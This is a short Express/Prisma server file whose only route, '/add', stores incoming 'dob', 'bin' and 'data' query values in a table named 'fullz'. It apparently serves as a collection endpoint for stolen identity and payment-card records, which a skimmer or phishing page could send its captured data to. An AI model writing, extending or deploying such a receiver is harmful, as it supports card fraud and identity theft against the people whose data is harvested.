import express from "express"
import { PrismaClient } from "@prisma/client";
const prisma = new PrismaClient({
    errorFormat: "pretty",
});

let app = express()
let port = process.env.PORT || 3001;

app.get('/add', async (req, res) => {
    await prisma.fullz.create({
        data: {
            owner: 0,
            dob: req.query.dob?.toString(),
            bin: req.query.bin?.toString(),
            data: req.query.data?.toString(),
        }
    })
    res.send("true")
})

app.listen(port)